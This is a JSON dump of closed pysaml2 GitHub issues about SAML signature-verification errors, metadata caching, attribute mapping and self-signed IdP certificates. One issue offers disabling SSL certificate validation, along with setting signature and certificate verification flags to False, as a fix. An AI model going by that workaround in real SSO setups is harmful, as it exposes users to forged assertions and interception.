"gists_url": "https://api.github.com/users/hjwp/gists{/gist_id}", "starred_url": "https://api.github.com/users/hjwp/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hjwp/subscriptions", "organizations_url": "https://api.github.com/users/hjwp/orgs", "repos_url": "https://api.github.com/users/hjwp/repos", "events_url": "https://api.github.com/users/hjwp/events{/privacy}", "received_events_url": "https://api.github.com/users/hjwp/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 8, "created_at": "2018-08-06T13:01:11Z", "updated_at": "2018-11-28T16:32:40Z", "closed_at": "2018-08-06T13:21:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n\r\ntested in pysaml v 4.5.0 and 4.0.3.  xmlsec-dev 1.2.22 works fine, 1.2.25 seems to break things.\r\n\r\n## Expected Behavior\r\n\r\nokta/saml login should work.\r\n\r\n## Current Behavior\r\n\r\non processing saml response from idp:\r\n\r\nPython traceback:\r\n\r\n```\r\n  File \"/usr/lib/python3.6/site-packages/saml2/client_base.py\", line 599, in parse_authn_request_response\r\n    binding, **kwargs)\r\n  File \"/usr/lib/python3.6/site-packages/saml2/entity.py\", line 1137, in _parse_response\r\n    response = response.loads(xmlstr, False, origxml=origxml)\r\n  File \"/usr/lib/python3.6/site-packages/saml2/response.py\", line 510, in loads\r\n    self._loads(xmldata, decode, origxml)\r\n  File \"/usr/lib/python3.6/site-packages/saml2/response.py\", line 335, in _loads\r\n    **args)\r\n  File \"/usr/lib/python3.6/site-packages/saml2/sigver.py\", line 1743, in correctly_signed_response\r\n    class_name(response), origdoc)\r\n  File \"/usr/lib/python3.6/site-packages/saml2/sigver.py\", line 1558, in _check_signature\r\n    raise SignatureError(\"Failed to verify signature\")\r\nsaml2.sigver.SignatureError: Failed to verify signature\r\n```\r\n\r\n\r\nlogs see the following otuput:\r\n\r\n```\r\n\"Usage: xmlsec <command> [<options>] [<files>]\r\n\r\nxmlsec is a command line tool for signing, verifying, encrypting and\r\ndecrypting XML documents. The allowed <command> values are:\r\n  --help      \tdisplay this help information and exit\r\n  --help-all  \tdisplay help information for all commands/options and exit\r\n  --help-<cmd>\tdisplay help information for command <cmd> and exit\r\n  --version   \tprint version information and exit\r\n  --keys      \tkeys XML file manipulation\r\n  --sign      \tsign data and output XML document\r\n  --verify    \tverify signed document\r\n  --sign-tmpl \tcreate and sign dynamicaly generated signature template\r\n  --encrypt   \tencrypt data and output XML document\r\n  --decrypt   \tdecrypt data from XML document\r\n\r\n\r\nReport bugs to http://www.aleksey.com/xmlsec/bugs.html\r\n\r\nWritten by Aleksey Sanin <aleksey@aleksey.com>.\r\n\r\nCopyright (C) 2002-2016 Aleksey Sanin <aleksey@aleksey.com>. All Rights Reserved..\r\nThis is free software: see the source for copying information.\r\n\r\nfunc=xmlSecCryptoDLLibraryCreate:file=dl.c:line=130:obj=unknown:subj=lt_dlopenext:error=7:io function failed:name=\"libxmlsec1-openssl\"; errno=2\r\nfunc=xmlSecCryptoDLGetLibraryFunctions:file=dl.c:line=436:obj=unknown:subj=xmlSecCryptoDLLibraryCreate:error=1:xmlsec library function failed:crypto=openssl\r\nfunc=xmlSecCryptoDLLoadLibrary:file=dl.c:line=393:obj=unknown:subj=xmlSecCryptoDLGetLibraryFunctions:error=1:xmlsec library function failed: \r\nError: unable to load xmlsec-openssl library. Make sure that you have\r\nthis it installed, check shared libraries path (LD_LIBRARY_PATH)\r\nenvornment variable or use \"--crypto\" option to specify different\r\ncrypto engine.\r\nError: initialization failed\r\nfunc=xmlSecCryptoShutdown:file=app.c:line=65:obj=unknown:subj=unknown:error=9:feature is not implemented:details=cryptoShutdown\r\nError: xmlSecCryptoShutdown failed\r\nError: xmlsec crypto shutdown failed.\r\n\", \"func=xmlSecCryptoDLLibraryCreate:file=dl.c:line=130:obj=unknown:subj=lt_dlopenext:error=7:io function failed:name=\"libxmlsec1-openssl\"; errno=2\r\nfunc=xmlSecCryptoDLGetLibraryFunctions:file=dl.c:line=436:obj=unknown:subj=xmlSecCryptoDLLibraryCreate:error=1:xmlsec library function failed:crypto=openssl\r\nfunc=xmlSecCryptoDLLoadLibrary:file=dl.c:line=393:obj=unknown:subj=xmlSecCryptoDLGetLibraryFunctions:error=1:xmlsec library function failed: \r\nError: unable to load xmlsec-openssl library. Make sure that you have\r\nthis it installed, check shared libraries path (LD_LIBRARY_PATH)\r\nenvornment variable or use \"--crypto\" option to specify different\r\ncrypto engine.\r\nError: initialization failed\r\nfunc=xmlSecCryptoShutdown:file=app.c:line=65:obj=unknown:subj=unknown:error=9:feature is not implemented:details=cryptoShutdown\r\nError: xmlSecCryptoShutdown failed\r\nError: xmlsec crypto shutdown failed.\r\n```\r\n\r\n## Possible Solution\r\nrecent xmlsec seems to have introduced a bug... maybe a commmand-line change?\r\n\r\n\r\n## Steps to Reproduce\r\n\r\n1.  build alpine-linux 3.8, apk install xmlsec-dev\r\n2.  attempt to validate a saml authentication post\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/532", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/532/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/532/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/532/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/532", "id": 347897958, "node_id": "MDU6SXNzdWUzNDc4OTc5NTg=", "number": 532, "title": "Provide a way to fetch asyncrounsly large Metadata and manage its content with a Cache system", "user": {"login": "peppelinux", "id": 1297620, "node_id": "MDQ6VXNlcjEyOTc2MjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/1297620?v=4", "gravatar_id": "", "url": "https://api.github.com/users/peppelinux", "html_url": "https://github.com/peppelinux", "followers_url": "https://api.github.com/users/peppelinux/followers", "following_url": "https://api.github.com/users/peppelinux/following{/other_user}", "gists_url": "https://api.github.com/users/peppelinux/gists{/gist_id}", "starred_url": "https://api.github.com/users/peppelinux/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/peppelinux/subscriptions", "organizations_url": "https://api.github.com/users/peppelinux/orgs", "repos_url": "https://api.github.com/users/peppelinux/repos", "events_url": "https://api.github.com/users/peppelinux/events{/privacy}", "received_events_url": "https://api.github.com/users/peppelinux/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-08-06T12:12:52Z", "updated_at": "2019-06-29T14:17:07Z", "closed_at": "2019-06-29T14:17:07Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "This is not an Issue but my thoughts about some improvements that could sounds more efficient in production environment. I wrote this post with my latest ideas, then I should read some other posts over the net to integrate them into this.\r\n\r\n## Expected Behavior\r\nCode and Documention about a metadata class like saml2.mdstore.MetaDataExtern, for example, to fetch metadatas from a cache system like nosql (memcached, redis...) or filesystem.\r\n\r\nI think that download should be scheduled when dealing with large data set, as federation's metadatas. Thus I think that this task could be also be done in a integrated way with the same Class, specialized methods.\r\n\r\n## Current Behavior\r\nAt the moment in pysaml2 metadata are donwloaded and stored in a specific filesystem path or downloaded at every http request. I put some notes here: https://github.com/peppelinux/Django-Identity/blob/master/djangosaml2_sp/djangosaml2_sp/djangosaml2_sp/sp_pysaml2_shibidp.py#L143 \r\n(nothing important, it want just to let newcomers to have some reference).\r\n\r\n## Possible Solution\r\nJust start the discussions, elements will be collected in future.\r\n\r\n## Additional resources\r\nhttps://github.com/knaperek/djangosaml2/issues/113#issuecomment-401441848\r\nhttps://github.com/IdentityPython/pysaml2/blob/master/src/saml2/mdstore.py", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/531", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/531/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/531/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/531/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/531", "id": 347637844, "node_id": "MDU6SXNzdWUzNDc2Mzc4NDQ=", "number": 531, "title": "Unknown attribute name", "user": {"login": "derchrisuk", "id": 706758, "node_id": "MDQ6VXNlcjcwNjc1OA==", "avatar_url": "https://avatars1.githubusercontent.com/u/706758?v=4", "gravatar_id": "", "url": "https://api.github.com/users/derchrisuk", "html_url": "https://github.com/derchrisuk", "followers_url": "https://api.github.com/users/derchrisuk/followers", "following_url": "https://api.github.com/users/derchrisuk/following{/other_user}", "gists_url": "https://api.github.com/users/derchrisuk/gists{/gist_id}", "starred_url": "https://api.github.com/users/derchrisuk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/derchrisuk/subscriptions", "organizations_url": "https://api.github.com/users/derchrisuk/orgs", "repos_url": "https://api.github.com/users/derchrisuk/repos", "events_url": "https://api.github.com/users/derchrisuk/events{/privacy}", "received_events_url": "https://api.github.com/users/derchrisuk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-08-04T18:12:03Z", "updated_at": "2018-08-05T01:45:06Z", "closed_at": "2018-08-05T01:45:06Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nI'm trying to setup a SSO for a Django App using SimpleSAMLphp as IDP, and djangosaml2 as SP, which is using pysaml2 (4.5.0).\r\nThe user table in Django has the following fields:\r\n\r\n`username, first_name, last_name, email`\r\n\r\nGot the following mapping in settings.py\r\n\r\n```\r\nSAML_ATTRIBUTE_MAPPING = {\r\n    'userid': ('username', ),\r\n    'email': ('email', ),\r\n    'firstname': ('first_name', ),\r\n    'lastname': ('last_name', ),\r\n    'is_staff': ('is_staff', ),\r\n    'is_superuser': ('is_superuser', ),\r\n}\r\n```\r\n\r\nWhich I try to map to the local user table.\r\nSo far I was not able to setup the way it should be\r\n\r\nWhen using following settings:\r\n\r\n```\r\nSAML_DJANGO_USER_MAIN_ATTRIBUTE = 'email'\r\nSAML_USE_NAME_ID_AS_USERNAME = True\r\nSAML_CREATE_UNKNOWN_USER = True\r\n```\r\n\r\nIt creates an entry with the email under email, nothing else.\r\n \r\nWhen using following settings:\r\n\r\n```\r\nSAML_USE_NAME_ID_AS_USERNAME = True\r\nSAML_CREATE_UNKNOWN_USER = True\r\n```\r\n\r\nIt creates an entry with email under username, nothing else\r\n\r\nWith following settings:\r\n\r\n```\r\nSAML_DJANGO_USER_MAIN_ATTRIBUTE = 'email'\r\nSAML_CREATE_UNKNOWN_USER = True\r\n```\r\n\r\nI get a 403 from /saml2/acs, no user setup\r\n\r\nWith the first 2 settings this is how the AttributeStatement looks like:\r\n\r\n```\r\n<saml:AttributeStatement> <saml:Attribute Name=\"userid\"\r\n                            NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"\r\n                            > <saml:AttributeValue xsi:type=\"xs:string\">testuser</saml:AttributeValue> </saml:Attribute> <saml:Attribute Name=\"firstname\"\r\n                            NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"\r\n                            > <saml:AttributeValue xsi:type=\"xs:string\">Test</saml:AttributeValue> </saml:Attribute> <saml:Attribute Name=\"lastname\"\r\n                            NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"\r\n                            > <saml:AttributeValue xsi:type=\"xs:string\">User</saml:AttributeValue> </saml:Attribute> <saml:Attribute Name=\"email\"\r\n                            NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"\r\n                            > <saml:AttributeValue xsi:type=\"xs:string\">a@b.cd</saml:AttributeValue> </saml:Attribute> </saml:AttributeStatement>\r\n```\r\n\r\n\r\nSo I can see all attributes.\r\nBut log says Unknown attribute name:\r\n\r\n```\r\n<saml:Attribute xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Name=\"userid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">testuser</saml:AttributeValue></saml:Attribute>\r\n2018-08-04 04:58:08,653 saml2.attribute_converter:INFO Unknown attribute name: <?xml version='1.0' encoding='UTF-8'?>\r\n<saml:Attribute xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Name=\"firstname\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Test</saml:AttributeValue></saml:Attribute>\r\n2018-08-04 04:58:08,653 saml2.attribute_converter:INFO Unknown attribute name: <?xml version='1.0' encoding='UTF-8'?>\r\n<saml:Attribute xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Name=\"lastname\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">User</saml:AttributeValue></saml:Attribute>\r\n2018-08-04 04:58:08,653 saml2.attribute_converter:INFO Unknown attribute name: <?xml version='1.0' encoding='UTF-8'?>\r\n<saml:Attribute xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Name=\"email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">a@b.cd</saml:AttributeValue></saml:Attribute>\r\n2018-08-04 04:58:08,654 saml2.response:DEBUG Assertion contains no attribute statements\r\n2018-08-04 04:58:08,654 saml2.response:DEBUG --- AVA: {}\r\n```\r\n\r\n\r\nIs there something else I need to setup?\r\nAlready using\r\n\r\n`\"allow_unknown_attributes\": True,`\r\n\r\nOnly email can be used at the moment, no other attributes are mapped into the user table.\r\nI also posted this in the Djangosaml2 repo, but I think these messages are coming from pysaml2.\r\nAny help much appreciated.\r\n\r\nThanks,\r\nchris", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/529", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/529/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/529/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/529/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/529", "id": 347351119, "node_id": "MDU6SXNzdWUzNDczNTExMTk=", "number": 529, "title": "New release", "user": {"login": "fmarco", "id": 7735024, "node_id": "MDQ6VXNlcjc3MzUwMjQ=", "avatar_url": "https://avatars3.githubusercontent.com/u/7735024?v=4", "gravatar_id": "", "url": "https://api.github.com/users/fmarco", "html_url": "https://github.com/fmarco", "followers_url": "https://api.github.com/users/fmarco/followers", "following_url": "https://api.github.com/users/fmarco/following{/other_user}", "gists_url": "https://api.github.com/users/fmarco/gists{/gist_id}", "starred_url": "https://api.github.com/users/fmarco/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/fmarco/subscriptions", "organizations_url": "https://api.github.com/users/fmarco/orgs", "repos_url": "https://api.github.com/users/fmarco/repos", "events_url": "https://api.github.com/users/fmarco/events{/privacy}", "received_events_url": "https://api.github.com/users/fmarco/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-08-03T10:52:55Z", "updated_at": "2018-08-03T11:50:55Z", "closed_at": "2018-08-03T11:50:55Z", "author_association": "NONE", "active_lock_reason": null, "body": "Could you please release the new version of pysaml on pypi (this fix, for example, is very precious https://github.com/IdentityPython/pysaml2/pull/519) ? Many thanks ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/513", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/513/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/513/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/513/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/513", "id": 336287985, "node_id": "MDU6SXNzdWUzMzYyODc5ODU=", "number": 513, "title": "SP with self-signed IDP cert", "user": {"login": "peppelinux", "id": 1297620, "node_id": "MDQ6VXNlcjEyOTc2MjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/1297620?v=4", "gravatar_id": "", "url": "https://api.github.com/users/peppelinux", "html_url": "https://github.com/peppelinux", "followers_url": "https://api.github.com/users/peppelinux/followers", "following_url": "https://api.github.com/users/peppelinux/following{/other_user}", "gists_url": "https://api.github.com/users/peppelinux/gists{/gist_id}", "starred_url": "https://api.github.com/users/peppelinux/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/peppelinux/subscriptions", "organizations_url": "https://api.github.com/users/peppelinux/orgs", "repos_url": "https://api.github.com/users/peppelinux/repos", "events_url": "https://api.github.com/users/peppelinux/events{/privacy}", "received_events_url": "https://api.github.com/users/peppelinux/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-06-27T15:50:37Z", "updated_at": "2018-06-29T09:07:57Z", "closed_at": "2018-06-28T23:08:30Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "This issue include two exception raised using self-signed IDP SSL certificates.\r\n\r\n1. If idp's metadata are downloaded on demand instead of a local file definition (solved, description above).\r\n2. if idp response also came with selfsigned data, after the login process, SSL verification fails.\r\n\r\n## Code Version\r\nDevelopment, 4.5.0 from github.\r\n\r\n## Expected Behavior\r\nin First case I solved this exception as follow.\r\n\r\n#### Exception:\r\nHTTPSConnectionPool(host='idp.testunical.it', port=443): Max retries exceeded with url: /idp/shibboleth (Caused by SSLError(SSLError(\"bad handshake: Error([('SSL routines', 'tls_process_server_certificate', 'certificate verify failed')],)\",),))\r\n\r\n#### Solution:\r\n```\r\n    # globals parameters\r\n    'disable_ssl_certificate_validation': True,\r\n    # or\r\n    'ca_certs' : os.path.join(BASE_DIR, 'certificates/shibidp', \"testunical.it-cacert.pem\"),\r\n\r\n    [....]\r\n\r\n    'metadata': {\r\n        # To verify the authenticity of the file downloaded from the net, the local copy of the public key should be used.\r\n        # This public key must be acquired by some out-of-band method.\r\n        # Uses metadata files, both local and remote, and will talk to whatever IdP that appears in any of the metadata files.\r\n        # 'local': [os.path.join(os.path.join(os.path.join(BASE_DIR, 'saml2_sp'), 'saml2_config'), 'idp_metadata.xml')],\r\n        #\r\n        # ondemand\r\n        \"remote\": [{\r\n            \"url\": \"{}/shibboleth\".format(IDP_URL),\r\n            # if self-signed must be globally defined also 'disable_ssl_certificate_validation': True, or \r\n            # valid path to ca_certs (see previous before [....])\r\n            \"cert\": \"/certificates/shibidp/idp.testunical.it-cert.pem\",\r\n             }]\r\n    },\r\n```\r\nGlobal definitions of  'disable_ssl_certificate_validation': True or 'ca_certs': $path,  outside of config['idp' works as expected. If metadata file is downloaded by hands/scheduler and defined inside config['idp']['local'] this exception doesn't exists at all.\r\n\r\nThis parameter is not actually described in official documentation, so I would suggest a PR on this if you agree. I studied its behaviour following code calls trough saml2.mdstore.MetadataStore.\r\n\r\nAnother important PR could manage the ca_certs validity path, if the path is wrong and the ca-cert.pem doesn't exists any Exception will be raised!\r\n\r\n2. The above exception raises even if I store the following parameters in config manager or. These attributes are and as I saw they are None/False by default:\r\n\r\n  - conf.validate_certificate = False\r\n   If True raises Exception: 'CertHandler' object has no attribute '_cert_handler_extra_class'\r\n\r\n  - conf.verify_encrypt_cert_advice = False\r\n  - conf.verify_encrypt_cert_assertion = False\r\n  - conf.verify_ssl_cert = False\r\n\r\nThe previous options probably needs to be documented too if you agree.\r\n\r\n## Current Behavior\r\nThe exception that I think that fails the decription was debugged following these calls:\r\nclient.py -> client_base.py -> entity.py -> response.py -> sigver.py -> self.verify_signature [#1458] -> self._check_signature [#1535]\r\n\r\nAfter a succesfull login on IDP raised Exception is the following:\r\n\r\n````\r\n============================================================\r\n\r\nfunc=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=360:obj=x509-store:subj=X509_verify_cert:error=4:crypto library function failed:subj=/CN=idp.testunical.it;err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=408:obj=x509-store:subj=unknown:error=71:certificate verification failed:err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLEvpSignatureVerify:file=signatures.c:line=493:obj=rsa-sha1:subj=EVP_VerifyFinal:error=18:data do not match:signature do not match\r\nFAIL\r\nSignedInfo References (ok/all): 1/1\r\nManifests References (ok/all): 0/0\r\nError: failed to verify file \"/tmp/tmpvpp6vc2w.xml\"\r\n\r\n------------------------------------------------------------\r\nfunc=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=360:obj=x509-store:subj=X509_verify_cert:error=4:crypto library function failed:subj=/CN=idp.testunical.it;err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=408:obj=x509-store:subj=unknown:error=71:certificate verification failed:err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLEvpSignatureVerify:file=signatures.c:line=493:obj=rsa-sha1:subj=EVP_VerifyFinal:error=18:data do not match:signature do not match\r\nFAIL\r\nSignedInfo References (ok/all): 1/1\r\nManifests References (ok/all): 0/0\r\nError: failed to verify file \"/tmp/tmpvpp6vc2w.xml\"\r\n============================================================\r\ncheck_sig: func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=360:obj=x509-store:subj=X509_verify_cert:error=4:crypto library function failed:subj=/CN=idp.testunical.it;err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=408:obj=x509-store:subj=unknown:error=71:certificate verification failed:err=18;msg=self signed certificate\r\nfunc=xmlSecOpenSSLEvpSignatureVerify:file=signatures.c:line=493:obj=rsa-sha1:subj=EVP_VerifyFinal:error=18:data do not match:signature do not match\r\nFAIL\r\nSignedInfo References (ok/all): 1/1\r\nManifests References (ok/all): 0/0\r\nError: failed to verify file \"/tmp/tmpvpp6vc2w.xml\"\r\n````\r\nsaml_id user exists but the attributes dictionary is empty.\r\n````\r\nTrying to authenticate the user. Session info: {'not_on_or_after': 1530114669, 'name_id': <saml2.saml.NameID object at 0x7fd20c6d4828>, 'issuer': 'https://idp.testunical.it/idp/shibboleth', 'session_index': '_1a40838fb618c45e23e81880cad4dd07', 'ava': {}, 'authn_info': [('urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport', [], '2018-06-27T15:46:09.428Z')], 'came_from': '/'}\r\n````\r\n\r\nThe returning SAML xml, POSTED by browser to SP after a succesfull IDP login:\r\n\r\n````\r\n<saml2p:Response Destination=\"http://sp.pysaml2.testunical.it/saml2/acs/\"\r\n                 ID=\"_3e5d4628d2f1fc2265dc7f0dfedec60b\"\r\n                 InResponseTo=\"id-UXNsqEJqB53ajxeDk\"\r\n                 IssueInstant=\"2018-06-27T16:25:57.011Z\"\r\n                 Version=\"2.0\"\r\n                 xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\r\n                 > <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">https://idp.testunical.it/idp/shibboleth</saml2:Issuer> <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> <ds:SignedInfo> <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /> <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" /> <ds:Reference URI=\"#_3e5d4628d2f1fc2265dc7f0dfedec60b\"> <ds:Transforms> <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\" /> <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /> </ds:Transforms> <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" /> <ds:DigestValue>tzoNJUB4f8VrECqScjhsRO7PxvM=</ds:DigestValue> </ds:Reference> </ds:SignedInfo> <ds:SignatureValue> NrP6rwROEqKXWunMUpUhGDdRol7zl4YuKAX8GvEWNHdx8i6UlxOEbQyGVMdd+jxwOMNWMppoif9X V8Ju0I7YMDMnfdq2uJgsymfp6y1ShpYdKLE2v6eCwISvmfwTHp7C4+RQ1MamaBh8WoSolwptT1JN t/U3shryCUWpyP+1rcZodYgB11OSlJt/pt6QKVYArHIn3dAKg+oT2gbKH68OmMgIym4NmXxmD2lm DCnp7bVZvP7EnqVKU4skvKu6ra2mgOSSPZOk4UnxBZBFkgbLmwjhTvYubktVP16ni9tqZjl4bULZ UCOe4vtauDtGK5iARsezZR3c/YSO99xAlBp3GQ== </ds:SignatureValue> <ds:KeyInfo> <ds:X509Data> <ds:X509Certificate>MIIDLzCCAhegAwIBAgIUEaPas9ucwjRq3SAP9NtaAZ8TKNUwDQYJKoZIhvcNAQELBQAwHDEaMBgG A1UEAwwRaWRwLnRlc3R1bmljYWwuaXQwHhcNMTgwNjI1MDkxMzQ2WhcNMzgwNjI1MDkxMzQ2WjAc MRowGAYDVQQDDBFpZHAudGVzdHVuaWNhbC5pdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC ggEBAI6keyWivrDDoqifl9yMZ3oq+h22hJPXrRKj27zmJqXDgvdmZItL1/zAzs/duUUJQtCFPHXZ /crCmZpeN8W0qO/8n2OegKSrdXAMq6PQ+CeIWPrua0ntUsS8vkJLLYhP2UfFBiywRCh7UKje9aQ1 dDdhKM3uzudF3emcTSChsHMtC9GAkKW51IFeVO0xMAu2UaU9nMMwu8uuOkA3jgn3B+06SHitpSny 9HMs6fv/Wl4fJ79s8xGqyTGlnN+3eN/N1OnbQpRnMS1XcthcRFPUtSNREp39HIgLqNv/zxglTG9E rvQybAXrbWGsD8woE9fi4xgqxPQNmQtc2gELkP+EqiUCAwEAAaNpMGcwHQYDVR0OBBYEFGbJtyiD BzL+b7u15vYzakLWSrvqMEYGA1UdEQQ/MD2CEWlkcC50ZXN0dW5pY2FsLml0hihodHRwczovL2lk cC50ZXN0dW5pY2FsLml0L2lkcC9zaGliYm9sZXRoMA0GCSqGSIb3DQEBCwUAA4IBAQBmdKDqWE1y YKdetPVo+/6gcl0yA3d4FyXD4XobnCzvpqAvLmYHynX7DKSFllChSqlpJDRVWZ0qmZtXrHIPN4Cw Xy4x3aqUbr4mvmKipZVdCFL11Cn3Xd5r+U8G2mheIwIKh7iB2rTZEUvDRue9y0f4cMAIhzmsKz50 UR9FxZ9byz/r+M7qZ3Hshhf/kFoqeN49WO+5xrnk1PMCwHCBRTNl8ZW4MYDOfSyZK0ohw1aRpXN0 7Qk0A6ug88fjfWvPFgmk8WYmTJvMSd7ISRnSJVUkbbjVWVkfBvR/QEUu61zVsl4KHuue6OGhAjoF 8hme9ts9J1BoBLBJv4/r3e/MqxCb</ds:X509Certificate> </ds:X509Data> </ds:KeyInfo> </ds:Signature> <saml2p:Status> <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" /> </saml2p:Status> <saml2:EncryptedAssertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <xenc:EncryptedData Id=\"_ac13a4911e0a96f9c897300bb62199cc\"\r\n                            Type=\"http://www.w3.org/2001/04/xmlenc#Element\"\r\n                            xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"\r\n                            > <xenc:EncryptionMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#aes128-cbc\"\r\n                                   xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"\r\n                                   /> <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> <xenc:EncryptedKey Id=\"_569bc30647b19c9e047c8c0aa2449a66\"\r\n                                   Recipient=\"http://sp.pysaml2.testunical.it/saml2/metadata/\"\r\n                                   xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"\r\n                                   > <xenc:EncryptionMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p\"\r\n                                           xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"\r\n                                           > <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"\r\n                                         xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"\r\n                                         /> </xenc:EncryptionMethod> <ds:KeyInfo> <ds:X509Data> <ds:X509Certificate>MIIDsTCCApmgAwIBAgIJAKRvRI2n8KsWMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAklUMRMw EQYDVQQIDApTb21lLVN0YXRlMRMwEQYDVQQKDAp0ZXN0dW5pY2FsMRMwEQYDVQQLDAp0ZXN0dW5p Y2FsMSEwHwYDVQQDDBhzcC5weXNhbWwyLnRlc3R1bmljYWwuaXQwHhcNMTgwNjI3MTQ0OTEyWhcN MjgwNjI2MTQ0OTEyWjBvMQswCQYDVQQGEwJJVDETMBEGA1UECAwKU29tZS1TdGF0ZTETMBEGA1UE CgwKdGVzdHVuaWNhbDETMBEGA1UECwwKdGVzdHVuaWNhbDEhMB8GA1UEAwwYc3AucHlzYW1sMi50 